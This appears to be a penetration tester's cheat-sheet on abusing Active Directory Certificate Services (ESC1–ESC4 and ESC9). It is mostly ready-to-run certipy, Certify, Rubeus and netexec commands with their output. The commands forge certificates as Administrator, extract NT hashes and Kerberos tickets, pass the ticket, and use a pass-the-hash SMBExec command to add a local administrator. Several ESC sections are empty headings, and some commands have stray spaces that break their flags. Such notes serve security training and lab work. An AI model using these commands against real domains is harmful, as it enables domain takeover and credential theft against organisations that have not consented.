---
title: "🛠️ ADCS Abusing"
date: 2026-09-03
draft: false
description: Abusing Active Directory Certificate Services (ADCS)
topics: ["active-directory"]
---



### Information Gathering

* Search if CA is used

```bash
┌──(kali㉿kali)-[~/…/machines/lab/certified-medium/certify]
└─$ netexec ldap domain_controlled -d domain.local  -u 'user' -p 'password' -M adcs

SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:domain.loca) (signing:True) (SMBv1:False)
LDAP        10.10.11.41     389    DC01             [+] domain.local\user:password 
ADCS        10.10.11.41     389    DC01             [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.10.11.41     389    DC01             Found PKI Enrollment Server: DC01.domain.local
ADCS        10.10.11.41     389    DC01             Found CN: certified-DC01-CA

```

* Search vulnerability

```bash
certify.exe find /vulnerable
```

```bash
certipy find -u 'user' -hashes '3b181b914e7a9d5508ea1e20bc2b7fce'  -dc-ip 10.10.11.51   
```

```bash
certipy find -u 'billy@foobar.com' -p <password> -dc-ip <DC_IP> -vulnerable -enabled
```

#### Extracting ccache

```bash
certipy auth -pfx administrator.pfx -username administrator -domain lab.local -dc-ip 10.129.205.199
```

#### Extracting nthash

```bash
certipy auth -pfx administrator.pfx -domain domain.local
```

#### Convert Certificate obtained from Windows

```bash
PS C:\Tools> & "C:\Program Files\OpenSSL-Win64\bin\openssl.exe" pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" - export -out cert.pfx
```

#### Authenticate in windows

```powershell
PS C:\Tools> .\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap
```

#### Certificate Authentication and extract NTLM

```powershell
PS C:\Tools> .\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /nowrap
```

#### Create a Sacrificial Logon Session with Rubeus

```powershell
PS C:\Tools> .\Rubeus.exe createnetonly /program:powershell.exe /show
```

#### Import Base64 Ticketin into the Powershell session using Rubeus

```powershell
PS C:\Tools> .\Rubeus.exe ptt /ticket:doIGQjCCBj6gAwIBBaEDAgEW<SNIP>
```

### ESC1 - template-allows-san

&#x20;[ESC1](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc1) is when a certificate template permits Client Authentication and allows the enrollee to supply an arbitrary Subject Alternative Name (SAN). Request a certificate based on the vulnerable certificate template and specify an arbitrary UPN.

```ad-tldr
The primary misconfiguration behind this domain escalation scenario lies in the possibility of specifying an alternate user in the certificate request. This means that if a certificate template allows including a subjectAltName ( SAN ) different from the user making the certificate request (CSR), it would allow us to request a certificate as any user in the domain
 
```

* find

```bash
certipy find -u 'billy@foobar.com' -p <password> -dc-ip <DC_IP> -vulnerable -stdout
```

* abuse

```bash
certipy-ad req -u user -target target.local -upn administrator@target.local -ca hostname_ca -template vulnerable_template -hashes NTLM_HASH -key-size 4096  -dns 10.10.11.51 -dc-ip 10.10.11.51

certipy req -u '[email protected]' -p 'Password123!' -dc-ip 10.129.205.199 -ca lab-LAB-DC-CA -template ESC1 -upn Administrator
```

* From Windows

```powershell
.\Certify.exe request /ca:caName /template:vulnerableTemplateName /altname:[target]
```

### ESC2 - variation of ESC1

ESC2 ( Escalation 2 ) is a variation of ESC1.\
When a certificate template specifies the `Any Purpose Extended Key Usage (EKU)` or does not identify any `Extended Key Usage`, the certificate can be used for any purpose (client authentication, server authentication, code signing, etc.)

```bash
certipy req -u '[email protected]' -p 'Password123!' -ca lab-LAB-DC-CA - template ESC2 -upn Administrator
```

```ad-info
Note: It is possible to omit the -dc-ip "IP DC" command if the attacking computer can resolve the domain name
```

```powershell
PS C:\Tools> Set-ExecutionPolicy Bypass -Scope CurrentUser -Force 
PS C:\Tools> cd .\Invoke-TheHash\;Import-Module .\Invoke-TheHash.psm1

PS C:\Tools> Invoke-TheHash -Type SMBExec -Target localhost -Username Administrator -Hash 2b576acbe6bcfda7294d6bd18041b8fe -Command "net localgroup Administrators grace /add"
```

### ESC3 - Misconfigured Enrollment Agent Templates

Involves exploiting a different `Extended Key Usage (EKU)` and necessitates an additional step to carry out the abuse.

```ad-note
The term Extended Key Usage is sometimes used as Enhanced Key Usage by Microsoft documentation, but section 4.2.1.12 of RFC 5280 defines the correct name as Extended Key Usage 
```

```bash
certipy req -u '[email protected]' -p 'Password123!' -ca 'lab-LAB-DC-CA' - template 'ESC3'

certipy req -u '[email protected]' -p 'Password123!' -ca lab-LAB-DC-CA - template 'User' -on-behalf-of 'lab\administrator' -pfx blwasp.pfx
```

### ESC4 - certificate-templates

[ESC4](https://github.com/ly4k/Certipy?tab=readme-ov-file#esc4) is when a user has write privileges over a certificate template.\
This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to **ESC1**. We need to know the DNS name and the Template Name

```bash
certipy template -username user@target.local  -hashes NTLM_HASH  -template Vulnerable_template  -save-old 
```

### ESC5

### ESC6

### ESC7

### ESC8

### ESC9 - no-security-extension

To understand this privilege escalation, it is recommended to know how certificate mapping is performed. It is presented in [this section](https://www.thehacker.recipes/ad/movement/adcs/certificate-templates#certificate-mapping).

If the certificate attribute `msPKI-Enrollment-Flag` contains the flag `CT_FLAG_NO_SECURITY_EXTENSION`, the `szOID_NTDS_CA_SECURITY_EXT` extension will not be embedded, meaning that even with `StrongCertificateBindingEnforcement` set to `1`, the mapping will be performed similarly as a value of `0` in the registry key.

Here are the requirements to perform ESC9:

* `StrongCertificateBindingEnforcement` not set to `2` (default: `1`) or `CertificateMappingMethods` contains `UPN` flag (`0x4`)
* The template contains the `CT_FLAG_NO_SECURITY_EXTENSION` flag in the `msPKI-Enrollment-Flag` value
* The template specifies client authentication
* `GenericWrite` right against any account A/1 to compromise any account B/2
* Update upn user2

```bash
certipy account update -username "user1@domain.local" -hashes "a091c1832bcdd4677c28b5a6a1295584" -user "user2" -upn Administrator
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Updating user 'user2':
    userPrincipalName                   : Administrator
[*] Successfully updated 'user2'
                               
```

* Get `pfx`

```bash
certipy req -username "user2" -p "12345678" -target "10.10.11.41" -ca 'CA_NAME' -template 'TemplateName'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 7
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

* Extracting NTHASH

```bash
certipy auth -pfx administrator.pfx -domain domain.local
```

### ESC10

### ESC11

### ESC12

### ESC13

### ESC14

### ESC15

### Risorse

* https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-1-799f3d3b03cf
* https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-2-ac7f925d1547
* https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-3-33efb00856ac
* https://www.thehacker.recipes/ad/movement/adcs/
* https://posts.specterops.io/certified-pre-owned-d95910965cd2
* https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin
* https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/